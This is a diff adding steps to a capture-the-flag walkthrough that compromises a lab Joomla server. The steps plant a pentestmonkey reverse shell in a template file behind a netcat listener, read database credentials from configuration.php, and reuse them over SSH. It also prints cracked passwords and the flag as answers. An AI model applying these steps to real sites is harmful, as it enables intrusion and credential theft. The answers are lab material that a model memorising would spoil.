@@ -101,8 +101,34 @@ Session completed.
 ```
 12. Question `What is Jonah's cracked password?` Answer `spiderman123`
 13. Now we can login using username `jonah` and password `spiderman123` on http://10.10.250.153/administrator/.
-14. Now just goto `Extensions` > `Templates` > `Templates` and select `Beez3` and edit the index.php file to get reverse shell.
-15. 
+14. Now just goto `Extensions` > `Templates` > `Templates` and select `Beez3` and edit the `index.php` file to get reverse shell.
+15. Now started  `netcat` with `nc -lvnp 1234` and replaced the code in `index.php` with pentestmonkey shell with own ip port and save.
+16. Opening http://10.10.250.153/templates/beez3/index.php will give shell.
+```bash
+nc -nlvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.250.153 56764
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 04:23:12 up  5:27,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+```
+17. We can see only user named `jjameson` with command `ls /home`.
+18. After some digging we got some password `nv5uz9r3ZEDzVjNu` inside `/var/www/html/configuration.php` using `cat /var/www/html/configuration.php`.
+19. So used the password to login ssh as user `jjameson` and got the flag
+```bash ssh jjameson@10.10.250.153
+The authenticity of host '10.10.250.153 (10.10.250.153)' can't be established.
+ED25519 key fingerprint is SHA256:Gvd5jH4bP7HwPyB+lGcqZ+NhGxa7MKX4wXeWBvcBbBY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.250.153' (ED25519) to the list of known hosts.
+jjameson@10.10.250.153's password: nv5uz9r3ZEDzVjNu
+Last login: Tue Mar  5 04:27:31 2024
+[jjameson@dailybugle ~]$ cat /home/jjameson/user.txt
+27a260fe3cba712cfdedb1c86d80442e
+```
+20. Question `What is the user flag?` Answer `27a260fe3cba712cfdedb1c86d80442e`
+21. 
 
 ## Credits
 
